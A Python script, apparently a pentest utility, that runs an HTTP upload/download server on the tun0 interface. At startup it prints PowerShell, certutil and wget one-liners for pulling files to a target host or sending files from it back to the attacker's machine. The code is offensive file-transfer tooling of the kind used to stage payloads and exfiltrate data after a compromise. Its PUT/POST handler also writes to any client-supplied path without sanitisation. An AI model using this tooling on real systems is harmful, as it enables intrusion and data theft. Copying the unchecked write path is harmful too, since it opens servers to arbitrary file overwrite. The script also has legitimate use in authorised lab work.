#!/usr/bin/env python3

import os
import sys
import socket
import subprocess
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
import re

BASE_DIR = "."  # default to current dir

# Function to get the IP address of tun0 interface
def get_tun0_ip():
    try:
        ip = subprocess.check_output("ip addr show tun0", shell=True).decode()
        match = re.search(r"inet\s(\d+\.\d+\.\d+\.\d+)", ip)
        if match:
            return match.group(1)
        else:
            return None
    except Exception as e:
        print("tun0 not found, falling back to default interface.")

    try:
        # Get primary external IP (non-loopback, non-docker, etc.)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Doesn't send data
        fallback_ip = s.getsockname()[0]
        s.close()
        return fallback_ip
    except Exception as e:
        print(f"Error retrieving fallback IP address: {e}")
        return None

# Custom handler for HTTP server
class Handler(BaseHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        path = os.path.join(BASE_DIR, self.path.lstrip("/"))
        with open(path, "wb") as f:
            f.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        self.do_PUT()  # Same handler for simplicity

    def do_GET(self):
        path = os.path.join(BASE_DIR, self.path.lstrip("/"))
        if os.path.isfile(path):
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            with open(path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"File not found.\n")

# Main function to start the server and print usage info
def main():
    parser = argparse.ArgumentParser(description="Simple HTTP upload/download server")
    parser.add_argument('port', type=int, help="Port number to listen on")
    parser.add_argument('path', nargs='?', default='.', help="Base directory for file operations (default: current directory)")
    parser.add_argument('--file', help="Optional file argument")
    
    args = parser.parse_args()
    
    port = args.port
    global BASE_DIR
    BASE_DIR = args.path
    file = args.file

    # Get the IP address of tun0
    ip = get_tun0_ip()
    if not ip:
        print("Error: Could not get IP address for tun0 interface.")
        sys.exit(1)

    # Print PowerShell and wget commands
    print(f"Use the following commands to upload (and download) a file to the server:")

    # PowerShell commands
    print("\nWindows PS:")
    if file:
        print(f"Invoke-WebRequest -Uri http://{ip}:{port}/{file} -Method PUT -InFile {file}")
        print(f"Invoke-WebRequest -Uri http://{ip}:{port}/{file} -Method POST -InFile {file}")
        print(f"iwr -uri http://{ip}:{port}/{file} -Outfile {file}")
        print(f"certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}")
    else:
        print(f"Invoke-WebRequest -Uri http://{ip}:{port}/<outfile> -Method PUT -InFile <file_path>")
        print(f"Invoke-WebRequest -Uri http://{ip}:{port}/<outfile> -Method POST -InFile <file_path>")
        print(f"iwr -uri http://{ip}:{port}/<file_path> -Outfile <outfile>")
        print(f"certutil.exe -urlcache -split -f http://{ip}:{port}/<file_path> <outfile>")


    # wget commands
    print("\nLinux wget:");
    if file:
        print(f"wget http://{ip}:{port}/{file} -O {file}")
        print(f"wget --method=PUT -O - -q --server-response --body-file={file} http://{ip}:{port}/{file}")
        print(f"wget --method=POST -O - -q --server-response --body-file={file} http://{ip}:{port}/{file}")
    else:
        print(f"wget --method=PUT -O - -q --server-response --body-file=<file_path> http://{ip}:{port}/<outfile>")
        print(f"wget --method=POST -O - -q --server-response --body-file=<file_path> http://{ip}:{port}/<outfile>")
        print(f"wget http://{ip}:{port}/<file_path> -O <outfile>")

    # Start the HTTP server
    server_address = ('', int(port))
    httpd = HTTPServer(server_address, Handler)
    print(f"\nStarting server on port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    main()


